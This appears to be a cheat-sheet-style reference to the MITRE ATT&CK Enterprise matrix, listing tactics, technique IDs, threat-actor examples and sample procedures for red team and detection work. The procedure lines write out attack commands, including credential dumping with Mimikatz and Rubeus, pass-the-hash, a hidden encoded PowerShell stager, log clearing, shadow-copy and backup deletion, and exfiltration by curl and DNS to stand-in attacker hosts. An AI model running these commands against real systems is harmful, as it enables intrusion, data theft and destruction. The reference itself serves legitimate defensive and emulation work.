# MITRE ATT&CK® Enterprise Skills Reference
**Framework Version: v18 (October 2025)**
**Matrix: Enterprise | 14 Tactics | 216 Techniques | 475 Sub-Techniques**

> TTPs = Tactics, Techniques, and Procedures. This document organizes the full ATT&CK Enterprise matrix for use in red team planning, adversary emulation, threat hunting, and detection engineering. All Tactic IDs (TA####) and Technique IDs (T####) reference official MITRE ATT&CK identifiers.

---

## How to Read This Document

| Term | Definition |
|---|---|
| **Tactic** | The adversary's high-level goal (the *why*) |
| **Technique** | The specific method used to achieve the tactic (the *how*) |
| **Sub-Technique** | A more granular variant of a technique (e.g., T1059.001 = PowerShell under T1059) |
| **Procedure** | A real-world observed instance of a technique used by a specific threat actor or tool |
| **TID** | Technique ID (e.g., T1059) |

---

## TA0043 — Reconnaissance
**Goal:** Gather information to plan future operations before initial access.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1595 | Active Scanning | T1595.001 IP/Port Scan; T1595.002 Vulnerability Scan; T1595.003 Wordlist Scan |
| T1592 | Gather Victim Host Info | T1592.001 Hardware; T1592.002 Software; T1592.003 Firmware; T1592.004 Client Config |
| T1589 | Gather Victim Identity Info | T1589.001 Credentials; T1589.002 Email Addresses; T1589.003 Employee Names |
| T1590 | Gather Victim Network Info | T1590.001 Domain Properties; T1590.002 DNS; T1590.004 Network Topology; T1590.005 IP Addresses |
| T1591 | Gather Victim Org Info | T1591.001 Determine Physical Locations; T1591.002 Business Relationships; T1591.004 Identify Roles |
| T1598 | Phishing for Information | T1598.001 Spearphishing via Service; T1598.002 Attachment; T1598.003 Link |
| T1597 | Search Closed Sources | T1597.001 Threat Intelligence Vendors; T1597.002 Purchase Technical Data |
| T1596 | Search Open Technical Databases | T1596.001 DNS/Passive DNS; T1596.002 WHOIS; T1596.004 CDNs; T1596.005 Shodan/Censys |
| T1593 | Search Open Websites/Domains | T1593.001 Social Media; T1593.002 Search Engines; T1593.003 Code Repositories |
| T1594 | Search Victim-Owned Websites | Scraping public-facing sites for org info, personnel, and technology stack |

### Example Procedures
- **APT28**: Uses open-source tools and Shodan to identify internet-facing services prior to exploitation.
- **Lazarus Group**: Performs LinkedIn and GitHub profiling to identify developers and source code repositories.
- **Procedure**: `amass enum -d target.com` → passive subdomain enumeration feeding into active scan queue.
- **Procedure**: Certificate transparency queries via `crt.sh` to enumerate subdomains not in DNS.

---

## TA0042 — Resource Development
**Goal:** Establish resources to support operations (infrastructure, tools, accounts).

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1583 | Acquire Infrastructure | T1583.001 Domains; T1583.002 DNS Server; T1583.003 VPS; T1583.004 Serverless; T1583.006 Web Services |
| T1584 | Compromise Infrastructure | T1584.001 Domains; T1584.002 DNS Server; T1584.004 Server; T1584.005 Botnet |
| T1585 | Establish Accounts | T1585.001 Social Media; T1585.002 Email Accounts; T1585.003 Cloud Accounts |
| T1586 | Compromise Accounts | T1586.001 Social Media; T1586.002 Email Accounts; T1586.003 Cloud Accounts |
| T1587 | Develop Capabilities | T1587.001 Malware; T1587.002 Code Signing Certs; T1587.003 Digital Certificates; T1587.004 Exploits |
| T1588 | Obtain Capabilities | T1588.001 Malware; T1588.002 Tools; T1588.003 Code Signing Certs; T1588.006 Vulnerabilities |
| T1608 | Stage Capabilities | T1608.001 Upload Malware; T1608.002 Upload Tools; T1608.003 Install Digital Certificate; T1608.004 Drive-by Target |

### Example Procedures
- **APT29**: Registers typosquatted domains resembling target organizations and ages them for 30+ days to improve trust scores.
- **FIN7**: Purchases valid code-signing certificates to reduce AV detection of custom implants.
- **Procedure**: VPS provisioning via cryptocurrency → Nginx redirector setup → forward traffic to Cobalt Strike teamserver.
- **Procedure**: Create lookalike O365 tenant and phishing domain with valid Let's Encrypt TLS certificate.

---

## TA0001 — Initial Access
**Goal:** Gain a foothold in the target network.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1189 | Drive-by Compromise | Watering hole attacks via malicious scripts on legitimate sites |
| T1190 | Exploit Public-Facing Application | Web app CVE exploitation (Log4Shell, ProxyLogon, Citrix, etc.) |
| T1133 | External Remote Services | VPN, RDP, Citrix, Outlook Web Access with stolen/brute-forced creds |
| T1200 | Hardware Additions | Rogue USB, malicious keyboard, Raspberry Pi drop |
| T1566 | Phishing | T1566.001 Attachment; T1566.002 Link; T1566.003 Voice (Vishing); T1566.004 Spearphishing via Service |
| T1091 | Replication via Removable Media | Malware spreading via USB/CD |
| T1195 | Supply Chain Compromise | T1195.001 Compromise Software Dependencies; T1195.002 Software Supply Chain; T1195.003 Hardware Supply Chain |
| T1199 | Trusted Relationship | Compromise of MSP, IT vendor, or partner with legitimate access |
| T1078 | Valid Accounts | T1078.001 Default Accounts; T1078.002 Domain Accounts; T1078.003 Local Accounts; T1078.004 Cloud Accounts |

### Example Procedures
- **APT41**: Exploits public-facing web applications using known CVEs within days of public disclosure.
- **TA505**: Delivers macro-laden Office documents via targeted phishing with invoice lures.
- **Procedure**: HTML smuggling → JavaScript decodes payload client-side → drops .lnk file → executes PowerShell stager.
- **Procedure**: Password spraying against OWA with valid usernames from LinkedIn enumeration.

---

## TA0002 — Execution
**Goal:** Run adversary-controlled code on local or remote systems.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1059 | Command and Scripting Interpreter | T1059.001 PowerShell; T1059.002 AppleScript; T1059.003 Windows Cmd; T1059.004 Bash; T1059.005 VBScript; T1059.006 Python; T1059.007 JavaScript; T1059.008 Network Device CLI |
| T1609 | Container Administration Command | kubectl exec, docker exec for container-hosted workloads |
| T1610 | Deploy Container | Deploying a malicious container image into a cluster |
| T1203 | Exploitation for Client Execution | Browser exploits, Office exploits, PDF exploits |
| T1559 | Inter-Process Communication | T1559.001 Component Object Model (COM); T1559.002 Dynamic Data Exchange (DDE) |
| T1106 | Native API | Direct Win32 API / NT API calls to avoid detection |
| T1053 | Scheduled Task/Job | T1053.002 At; T1053.003 Cron; T1053.005 Scheduled Task; T1053.006 Systemd Timer |
| T1129 | Shared Modules | Loading malicious DLLs or shared libraries |
| T1072 | Software Deployment Tools | Abuse of SCCM, Ansible, PDQ, or other deployment platforms |
| T1569 | System Services | T1569.001 Launchctl; T1569.002 Service Execution (sc.exe, PsExec) |
| T1204 | User Execution | T1204.001 Malicious Link; T1204.002 Malicious File; T1204.003 Malicious Image |
| T1047 | Windows Management Instrumentation | WMI for remote execution and persistence |

### Example Procedures
- **Cobalt Strike**: Uses PowerShell (T1059.001) to reflectively load Beacon into memory from a stager URL.
- **Turla**: Uses COM object hijacking (T1559.001) to execute implants without dropping files to disk.
- **Procedure**: `powershell.exe -nop -w hidden -enc <base64_payload>` — encoded stager download.
- **Procedure**: `wmic /node:REMOTE process call create "cmd.exe /c ..."` — remote WMI execution.

---

## TA0003 — Persistence
**Goal:** Maintain access across restarts, credential changes, and other interruptions.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1098 | Account Manipulation | T1098.001 Additional Cloud Credentials; T1098.002 Additional Email Delegate Perms; T1098.004 SSH Authorized Keys |
| T1197 | BITS Jobs | Background Intelligent Transfer Service for persistence and download |
| T1547 | Boot or Logon Autostart Execution | T1547.001 Registry Run Keys; T1547.004 Winlogon Helper DLL; T1547.006 Kernel Modules; T1547.009 Shortcut Modification |
| T1037 | Boot or Logon Initialization Scripts | T1037.001 Logon Script (Windows); T1037.002 Logon Script (Mac); T1037.004 RC Scripts |
| T1176 | Browser Extensions | Malicious or compromised browser add-ons |
| T1554 | Compromise Host Software Binary | Backdooring legitimate binaries on disk |
| T1136 | Create Account | T1136.001 Local Account; T1136.002 Domain Account; T1136.003 Cloud Account |
| T1543 | Create or Modify System Process | T1543.001 Launch Agent; T1543.002 Systemd Service; T1543.003 Windows Service |
| T1546 | Event Triggered Execution | T1546.003 Windows Management Instrumentation Event Subscription; T1546.008 Accessibility Features |
| T1133 | External Remote Services | Maintaining persistent VPN/RDP access with stolen credentials |
| T1574 | Hijack Execution Flow | T1574.001 DLL Search Order Hijacking; T1574.002 DLL Side-Loading; T1574.004 Dylib Hijacking |
| T1525 | Implant Internal Image | Backdooring container images or VM templates |
| T1556 | Modify Authentication Process | T1556.001 Domain Controller Auth; T1556.002 Password Filter DLL; T1556.004 Network Device Auth |
| T1137 | Office Application Startup | T1137.001 Office Template Macros; T1137.006 Add-ins |
| T1505 | Server Software Component | T1505.001 SQL Stored Procedures; T1505.003 Web Shell; T1505.004 IIS Components |
| T1078 | Valid Accounts | Maintaining access using compromised credentials |

### Example Procedures
- **APT29**: Uses WMI event subscriptions (T1546.003) to execute implants when specific system events fire.
- **Lazarus**: Plants web shells on internet-facing servers as persistent re-entry points.
- **Procedure**: `schtasks /create /tn "Updater" /tr "powershell.exe -w hidden -c ..." /sc onlogon`
- **Procedure**: Add attacker public key to `/root/.ssh/authorized_keys` on a compromised Linux host.

---

## TA0004 — Privilege Escalation
**Goal:** Gain higher-level permissions (admin, SYSTEM, root, domain admin).

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1548 | Abuse Elevation Control Mechanism | T1548.002 Bypass UAC; T1548.003 Sudo and Sudo Caching; T1548.004 Elevated Execution with Prompt |
| T1134 | Access Token Manipulation | T1134.001 Token Impersonation/Theft; T1134.002 Create Process with Token; T1134.004 Parent PID Spoofing |
| T1547 | Boot or Logon Autostart Execution | (See Persistence — overlapping tactic) |
| T1068 | Exploitation for Privilege Escalation | Local kernel CVE, driver exploit (e.g., PrintNightmare, CVE-2021-4034) |
| T1574 | Hijack Execution Flow | DLL hijacking leading to elevated process |
| T1055 | Process Injection | T1055.001 DLL Injection; T1055.002 PE Injection; T1055.004 Asynchronous Procedure Call; T1055.012 Process Hollowing |
| T1053 | Scheduled Task/Job | Abusing tasks that run as SYSTEM |
| T1078 | Valid Accounts | Using Domain Admin or local admin creds |
| T1611 | Escape to Host | Container/VM escape to underlying host |

### Example Procedures
- **FIN7**: Uses token impersonation (T1134.001) via custom tool to inherit SYSTEM-level tokens from running services.
- **Procedure**: `PrintSpoofer.exe -i -c cmd` — SeImpersonatePrivilege → SYSTEM via spooler abuse.
- **Procedure**: `sudo -l` → identify NOPASSWD binaries → GTFOBins exploitation for root shell.
- **Procedure**: WriteDACL ACE on AdminSDHolder → propagation to protected accounts after 60-minute SDProp cycle.

---

## TA0005 — Defense Evasion
**Goal:** Avoid detection and analysis throughout the attack lifecycle.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1548 | Abuse Elevation Control Mechanism | UAC bypass variants |
| T1134 | Access Token Manipulation | Token theft, Parent PID spoofing |
| T1197 | BITS Jobs | Living-off-the-land file transfer and execution |
| T1622 | Debugger Evasion | Anti-analysis: detecting IsDebuggerPresent, hardware breakpoints |
| T1140 | Deobfuscate/Decode Files or Info | Decoding payloads in-memory at runtime |
| T1006 | Direct Volume Access | Bypassing file system protections via raw disk reads |
| T1484 | Domain or Tenant Policy Modification | Modifying GPOs or Conditional Access policies |
| T1480 | Execution Guardrails | T1480.001 Environmental Keying — only run in correct target env |
| T1211 | Exploitation for Defense Evasion | Exploiting security tool vulnerabilities |
| T1222 | File and Directory Permissions Modification | chmod/ACL changes to hide files |
| T1564 | Hide Artifacts | T1564.001 Hidden Files; T1564.003 Hidden Window; T1564.004 NTFS File Attributes; T1564.010 Process Argument Spoofing |
| T1574 | Hijack Execution Flow | DLL side-loading, search-order hijacking |
| T1562 | Impair Defenses | T1562.001 Disable/Modify Tools; T1562.002 Disable Windows Event Logging; T1562.006 Indicator Blocking; T1562.010 Downgrade Attack |
| T1070 | Indicator Removal | T1070.001 Clear Windows Event Logs; T1070.003 Clear Command History; T1070.004 File Deletion; T1070.006 Timestomp |
| T1202 | Indirect Command Execution | Forfiles, pcalua.exe, and other LOLBins |
| T1036 | Masquerading | T1036.001 Invalid Code Signature; T1036.003 Rename System Utilities; T1036.005 Match Legitimate Name or Location |
| T1112 | Modify Registry | Alter registry for hiding persistence or disabling defenses |
| T1620 | Reflective Code Loading | Load code directly into process memory (no disk write) |
| T1218 | System Binary Proxy Execution | T1218.001 Compiled HTML File; T1218.005 Mshta; T1218.007 Msiexec; T1218.010 Regsvr32; T1218.011 Rundll32 |
| T1553 | Subvert Trust Controls | T1553.002 Code Signing; T1553.004 Install Root Certificate |
| T1221 | Template Injection | Embedding malicious templates in Office docs |
| T1205 | Traffic Signaling | Port knocking, magic packet for implant activation |
| T1055 | Process Injection | Injecting into trusted processes (svchost, explorer) |
| T1497 | Virtualization/Sandbox Evasion | T1497.001 System Checks; T1497.003 Time-Based Evasion |
| T1600 | Weaken Encryption | Reducing key strength or disabling TLS validation |

### Example Procedures
- **Cobalt Strike**: Uses `rundll32.exe` (T1218.011) to load reflective DLL stagers into memory, avoiding on-disk artifacts.
- **APT41**: Patches AMSI in-memory before executing PowerShell payloads to bypass script-block logging.
- **Procedure**: `wevtutil cl Security` — clear Security event log to remove authentication artifacts.
- **Procedure**: ETW patching via `NtTraceControl` syscall to blind EDR telemetry collection.
- **Procedure**: Timestomping with `Invoke-Timestomp` to match file metadata of legitimate Windows DLLs.

---

## TA0006 — Credential Access
**Goal:** Steal account credentials to enable further access.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1110 | Brute Force | T1110.001 Password Guessing; T1110.002 Password Cracking; T1110.003 Password Spraying; T1110.004 Credential Stuffing |
| T1555 | Credentials from Password Stores | T1555.001 Keychain; T1555.003 Credentials from Web Browsers; T1555.004 Windows Credential Manager; T1555.005 Password Managers |
| T1212 | Exploitation for Credential Access | Exploiting services to obtain creds (e.g., Heartbleed, MS14-068) |
| T1187 | Forced Authentication | Coercing NTLM auth via UNC paths, WebDAV, PetitPotam |
| T1606 | Forge Web Credentials | T1606.001 SAML Tokens (Golden SAML); T1606.002 Web Cookies |
| T1056 | Input Capture | T1056.001 Keylogging; T1056.002 GUI Input Capture; T1056.003 Web Portal Capture; T1056.004 Credential API Hooking |
| T1557 | Adversary-in-the-Middle | T1557.001 LLMNR/NBT-NS Poisoning; T1557.002 ARP Cache Poisoning; T1557.003 DHCP Spoofing |
| T1040 | Network Sniffing | Capturing credentials from unencrypted network traffic |
| T1003 | OS Credential Dumping | T1003.001 LSASS Memory; T1003.002 SAM; T1003.003 NTDS; T1003.004 LSA Secrets; T1003.006 DCSync |
| T1528 | Steal Application Access Token | OAuth token theft |
| T1539 | Steal Web Session Cookie | Cookie hijacking for session reuse |
| T1558 | Steal or Forge Kerberos Tickets | T1558.001 Golden Ticket; T1558.002 Silver Ticket; T1558.003 Kerberoasting; T1558.004 AS-REP Roasting |
| T1552 | Unsecured Credentials | T1552.001 Credentials in Files; T1552.002 Credentials in Registry; T1552.004 Private Keys; T1552.006 Group Policy Preferences |

### Example Procedures
- **APT29**: Uses DCSync (T1003.006) with domain replication rights to pull all password hashes from Active Directory.
- **FIN6**: Deploys custom keyloggers (T1056.001) at POS endpoints to capture payment card data.
- **Procedure**: `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'` — dump LSASS credentials.
- **Procedure**: `Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt` → offline cracking with hashcat rule sets.
- **Procedure**: Responder → LLMNR poison → capture NTLMv2 → ntlmrelayx → relay to unpatched SMB signing host.

---

## TA0007 — Discovery
**Goal:** Learn about the internal environment to enable further operations.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1087 | Account Discovery | T1087.001 Local; T1087.002 Domain; T1087.003 Email; T1087.004 Cloud |
| T1010 | Application Window Discovery | Enumerate running GUI applications |
| T1217 | Browser Information Discovery | Reading browser history, bookmarks, saved sessions |
| T1580 | Cloud Infrastructure Discovery | EC2 instances, S3 buckets, IAM roles enumeration |
| T1538 | Cloud Service Dashboard | Enumerate cloud management portals |
| T1526 | Cloud Service Discovery | Identify available cloud services in target tenant |
| T1619 | Cloud Storage Object Discovery | List S3/Blob/GCS objects for sensitive data |
| T1613 | Container and Resource Discovery | Enumerate K8s pods, nodes, services, secrets |
| T1622 | Debugger Evasion | (overlaps with Defense Evasion — anti-analysis check) |
| T1482 | Domain Trust Discovery | Enumerate inter-domain and inter-forest trust relationships |
| T1083 | File and Directory Discovery | `dir`, `find`, `ls -la` for sensitive files |
| T1615 | Group Policy Discovery | Enumerate GPOs for attack paths and misconfigs |
| T1046 | Network Service Discovery | Port scanning internal hosts post-compromise |
| T1135 | Network Share Discovery | `net view`, `Get-SmbShare` — find accessible shares |
| T1040 | Network Sniffing | Passive internal traffic capture |
| T1201 | Password Policy Discovery | Enumerate domain password policy for spraying calibration |
| T1120 | Peripheral Device Discovery | Identify connected USB, printers |
| T1069 | Permission Groups Discovery | T1069.001 Local Groups; T1069.002 Domain Groups; T1069.003 Cloud Groups |
| T1057 | Process Discovery | `tasklist`, `ps aux`, `Get-Process` |
| T1012 | Query Registry | Read registry for installed software, config, credentials |
| T1018 | Remote System Discovery | `net view`, `nltest /dclist`, ARP table review |
| T1518 | Software Discovery | T1518.001 Security Software Discovery — find EDR/AV products |
| T1082 | System Information Discovery | OS version, hostname, architecture, domain membership |
| T1016 | System Network Configuration Discovery | IP config, routing tables, DNS settings |
| T1049 | System Network Connections Discovery | `netstat`, `ss`, active connections and listeners |
| T1033 | System Owner/User Discovery | Logged-on users, `whoami`, `query user` |
| T1124 | System Time Discovery | Sync with target time to avoid log timestamp anomalies |
| T1497 | Virtualization/Sandbox Evasion | Check if running inside VM/sandbox |

### Example Procedures
- **BloodHound**: Collects AD objects via SharpHound ingestors → maps shortest attack paths to Domain Admin.
- **Procedure**: `nltest /domain_trusts /all_trusts` → enumerate all domain/forest trust relationships.
- **Procedure**: `Get-NetLocalGroupMember -GroupName Administrators -ComputerName REMOTE` → enumerate local admins across hosts with PowerView.
- **Procedure**: Internal nmap sweep: `nmap -sV -p 22,80,443,445,3389,5985 10.10.0.0/16 -oA internal_scan`

---

## TA0008 — Lateral Movement
**Goal:** Move through the environment to reach objectives.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1210 | Exploitation of Remote Services | Exploit unpatched internal services (EternalBlue, BlueKeep) |
| T1534 | Internal Spearphishing | Phishing from a compromised internal account |
| T1570 | Lateral Tool Transfer | Moving tools between hosts via SMB, SCP, certutil, BITSAdmin |
| T1563 | Remote Service Session Hijacking | T1563.001 SSH Hijacking; T1563.002 RDP Hijacking |
| T1021 | Remote Services | T1021.001 RDP; T1021.002 SMB/Windows Admin Shares; T1021.003 DCOM; T1021.004 SSH; T1021.005 VNC; T1021.006 WinRM |
| T1091 | Replication via Removable Media | Spreading laterally through shared USB |
| T1072 | Software Deployment Tools | Using SCCM, Ansible, Puppet to push execution |
| T1080 | Taint Shared Content | Poisoning files on shared network drives |
| T1550 | Use Alternate Authentication Material | T1550.001 Application Access Token; T1550.002 Pass the Hash; T1550.003 Pass the Ticket; T1550.004 Web Session Cookie |

### Example Procedures
- **APT29**: Uses stolen Kerberos TGTs (Pass-the-Ticket, T1550.003) to access internal services without re-authenticating.
- **Procedure**: `impacket-psexec domain/user@10.10.10.5 -hashes :NTLMHASH` — PTH lateral movement via SMB.
- **Procedure**: `evil-winrm -i 10.10.10.5 -u Administrator -H NTLMHASH` — WinRM access with harvested hash.
- **Procedure**: DCOM lateral movement via `[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","REMOTE_HOST"))`.

---

## TA0009 — Collection
**Goal:** Gather data of interest to attacker objectives.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1557 | Adversary-in-the-Middle | Intercept traffic to capture sensitive data in transit |
| T1560 | Archive Collected Data | T1560.001 Archive via Utility (zip/rar/7z); T1560.002 Archive via Library; T1560.003 Archive via Custom Method |
| T1123 | Audio Capture | Microphone recording via implant |
| T1119 | Automated Collection | Scripts to automatically harvest files, emails, DB content |
| T1185 | Browser Session Hijacking | Capture ongoing authenticated sessions |
| T1115 | Clipboard Data | Harvest clipboard contents (passwords, URLs, tokens) |
| T1530 | Data from Cloud Storage | Access S3/Blob/GCS for data exfiltration staging |
| T1602 | Data from Configuration Repository | T1602.001 SNMP MIB Dump; T1602.002 Network Device Config Dump |
| T1213 | Data from Information Repositories | T1213.001 Confluence; T1213.002 SharePoint; T1213.003 Code Repositories |
| T1005 | Data from Local System | Filesystem search for credentials, PII, IP |
| T1039 | Data from Network Shared Drive | SMB share harvesting |
| T1025 | Data from Removable Media | Read USB-connected drives |
| T1074 | Data Staged | T1074.001 Local Data Staging; T1074.002 Remote Data Staging |
| T1114 | Email Collection | T1114.001 Local Email Collection; T1114.002 Remote Email Collection (EWS/IMAP); T1114.003 Email Forwarding Rule |
| T1056 | Input Capture | Keylogging, form grabbing |
| T1185 | Browser Session Hijacking | Riding live authenticated sessions |
| T1113 | Screen Capture | Screenshot or screen recording |
| T1125 | Video Capture | Webcam recording |

### Example Procedures
- **APT10**: Systematically stages collected data in a temp directory, compresses with 7-Zip, and encrypts before exfil.
- **Procedure**: PowerShell recursive file collection: `Get-ChildItem -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\staging\`
- **Procedure**: Exchange Web Services (EWS) mailbox dump using MailSniper: `Invoke-SelfSearch -Mailbox user@corp.com -Terms "password","VPN","SSN"`.
- **Procedure**: `secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile hashes LOCAL` — offline AD credential extraction.

---

## TA0011 — Command and Control (C2)
**Goal:** Communicate with compromised systems to control them.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1071 | Application Layer Protocol | T1071.001 Web Protocols (HTTP/S); T1071.002 File Transfer Protocols; T1071.003 Mail Protocols; T1071.004 DNS |
| T1092 | Communication Through Removable Media | Air-gapped C2 via USB pass-through |
| T1132 | Data Encoding | T1132.001 Standard Encoding (Base64); T1132.002 Non-Standard Encoding |
| T1001 | Data Obfuscation | T1001.001 Junk Data; T1001.002 Steganography; T1001.003 Protocol Impersonation |
| T1568 | Dynamic Resolution | T1568.001 Fast Flux DNS; T1568.002 Domain Generation Algorithms (DGA); T1568.003 DNS Calculation |
| T1573 | Encrypted Channel | T1573.001 Symmetric Cryptography; T1573.002 Asymmetric Cryptography (TLS) |
| T1008 | Fallback Channels | Secondary C2 channel if primary is blocked |
| T1105 | Ingress Tool Transfer | Downloading additional tools/payloads post-compromise |
| T1104 | Multi-Stage Channels | Stager → downloader → full implant chain |
| T1095 | Non-Application Layer Protocol | ICMP, raw TCP/UDP tunneling |
| T1571 | Non-Standard Port | Running C2 over unexpected ports (e.g., 8443, 4444) |
| T1572 | Protocol Tunneling | DNS-over-HTTPS, HTTP over SSH, RDP tunneling |
| T1090 | Proxy | T1090.001 Internal Proxy; T1090.002 External Proxy; T1090.003 Multi-hop Proxy; T1090.004 Domain Fronting |
| T1219 | Remote Access Software | TeamViewer, AnyDesk, ScreenConnect abuse |
| T1205 | Traffic Signaling | Port knocking to activate dormant implant |
| T1102 | Web Service | T1102.001 Dead Drop Resolver (Pastebin, GitHub); T1102.002 Bidirectional Communication (Slack, Teams, Discord) |

### Example Procedures
- **APT29**: Uses domain fronting (T1090.004) via trusted CDN providers (Cloudflare, Azure CDN) to mask C2 traffic origin.
- **Procedure**: Cobalt Strike HTTPS Beacon with malleable C2 profile mimicking Microsoft Teams traffic patterns.
- **Procedure**: DNS C2 via dnscat2 — all command traffic encoded in DNS TXT record queries to attacker-controlled nameserver.
- **Procedure**: Slack webhook C2 — implant polls a Slack channel every 60±30 seconds for commands, blending with corporate Slack traffic.

---

## TA0010 — Exfiltration
**Goal:** Steal data from the target environment.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1020 | Automated Exfiltration | T1020.001 Traffic Duplication — mirror traffic to attacker |
| T1030 | Data Transfer Size Limits | Chunking transfers to avoid DLP thresholds |
| T1048 | Exfiltration Over Alternative Protocol | T1048.001 Exfil over Symmetric Encrypted Non-C2; T1048.002 Asymmetric Encrypted Non-C2; T1048.003 Unencrypted Non-C2 |
| T1041 | Exfiltration Over C2 Channel | Piggyback data exfil on existing C2 protocol |
| T1011 | Exfiltration Over Other Network Medium | T1011.001 Exfil over Bluetooth |
| T1052 | Exfiltration Over Physical Medium | T1052.001 Exfil over USB |
| T1567 | Exfiltration Over Web Service | T1567.001 to Code Repository (GitHub); T1567.002 to Cloud Storage (S3, Dropbox, OneDrive); T1567.003 to Text Storage (Pastebin); T1567.004 via Webhook |
| T1029 | Scheduled Transfer | Transferring data only during business hours to blend in |

### Example Procedures
- **FIN7**: Exfiltrates compressed, encrypted archives via HTTPS to attacker-controlled S3-lookalike buckets.
- **Procedure**: `curl -T archive.7z https://attacker-bucket.s3.amazonaws.com/upload --aws-sigv4 ...` — S3 presigned URL upload.
- **Procedure**: DNS exfiltration — encode data as base32 subdomains: `<encoded_chunk>.exfil.attacker.com` with low TTL to avoid caching detection.
- **Procedure**: Split 50MB archive into 5MB chunks transferred 10 minutes apart to evade volume-based DLP alerts.

---

## TA0040 — Impact
**Goal:** Disrupt availability, integrity, or confidentiality; cause damage or achieve final objectives.

### Key Techniques

| TID | Technique | Sub-Techniques / Notes |
|---|---|---|
| T1531 | Account Access Removal | Locking out accounts during an attack (destructive) |
| T1485 | Data Destruction | Wiping files, databases, or disk sectors |
| T1486 | Data Encrypted for Impact | Ransomware deployment — encrypt and ransom |
| T1565 | Data Manipulation | T1565.001 Stored Data Manipulation; T1565.002 Transmitted Data Manipulation; T1565.003 Runtime Data Manipulation |
| T1491 | Defacement | T1491.001 Internal Defacement; T1491.002 External Defacement |
| T1561 | Disk Wipe | T1561.001 Disk Content Wipe; T1561.002 Disk Structure Wipe (MBR/VBR) |
| T1499 | Endpoint Denial of Service | T1499.001 OS Exhaustion Flood; T1499.002 Service Exhaustion Flood |
| T1657 | Financial Theft | BEC fraud, redirecting payments, draining accounts |
| T1495 | Firmware Corruption | Flashing malicious firmware to brick devices |
| T1490 | Inhibit System Recovery | Deleting VSS snapshots, disabling backup services |
| T1498 | Network Denial of Service | T1498.001 Direct Network Flood; T1498.002 Reflection Amplification |
| T1496 | Resource Hijacking | Cryptomining, compute abuse |
| T1489 | Service Stop | Stopping critical services (AV, backup, AD replication) |
| T1529 | System Shutdown/Reboot | Forcing reboot to disrupt operations or complete wipe |

### Example Procedures
- **Sandworm**: Deploys NotPetya (T1486 + T1561) — encrypts files and overwrites MBR to permanently destroy systems.
- **REvil/Sodinokibi**: Deletes VSS shadow copies (T1490) via `vssadmin delete shadows /all /quiet` before deploying ransomware.
- **Procedure**: `wbadmin delete catalog -quiet` + `bcdedit /set {default} recoveryenabled No` — disable recovery options pre-ransomware.
- **Procedure**: BEC fraud chain — compromise CFO email → intercept wire transfer request → redirect to attacker-controlled account.

---

## ATT&CK Matrices Overview

| Matrix | Tactics | Use Case |
|---|---|---|
| **Enterprise** | 14 | Windows, macOS, Linux, Cloud, Containers |
| **Mobile** | 12 | Android and iOS attacks |
| **ICS** | 12 | Industrial Control Systems / OT environments |

---

## Platform Coverage (Enterprise Matrix)

| Platform | Notes |
|---|---|
| Windows | Most extensive technique coverage |
| macOS | Growing coverage including T1553, T1547 variants |
| Linux | Bash, cron, systemd, kernel exploits |
| Cloud (IaaS) | AWS, Azure, GCP |
| Cloud (SaaS) | O365, G-Suite, Salesforce |
| Identity Providers | Entra ID / AAD, Okta |
| Containers | Docker, Kubernetes, ESXi (added v18) |
| Network Devices | Routers, switches, firewalls |

---

## Key Threat Actor → TTP Mappings

| Group | Primary TTPs | Notable Tools |
|---|---|---|
| APT29 (Cozy Bear) | T1566, T1059.001, T1003.006, T1090.004 | SUNBURST, MiniDuke, Cobalt Strike |
| APT41 | T1190, T1059, T1486, T1560 | Shadowpad, Winnti, PlugX |
| Lazarus Group | T1566.001, T1055, T1041, T1486 | BLINDINGCAN, Destover, custom loaders |
| FIN7 | T1566.001, T1059.005, T1056.001 | Carbanak, GRIFFON, PowerPlant |
| Sandworm | T1561, T1485, T1190, T1490 | BlackEnergy, NotPetya, Industroyer |
| REvil / LockBit | T1486, T1490, T1078, T1021 | Custom ransomware payloads |

---

## Useful ATT&CK Resources

| Resource | URL |
|---|---|
| ATT&CK Enterprise Matrix | https://attack.mitre.org/matrices/enterprise/ |
| ATT&CK Navigator (Heatmaps) | https://mitre-attack.github.io/attack-navigator/ |
| ATT&CK Groups | https://attack.mitre.org/groups/ |
| ATT&CK Software | https://attack.mitre.org/software/ |
| ATT&CK Mitigations | https://attack.mitre.org/mitigations/ |
| D3FEND (Defensive Counterpart) | https://d3fend.mitre.org/ |
| MITRE CALDERA (Adversary Emulation) | https://caldera.mitre.org/ |
| ATT&CK Workbench | https://github.com/center-for-threat-informed-defense/attack-workbench-frontend |

---

*Reference: MITRE ATT&CK® v18 — Enterprise Matrix. For authorized red team and defensive security use only.*
*ATT&CK® is a registered trademark of The MITRE Corporation.*
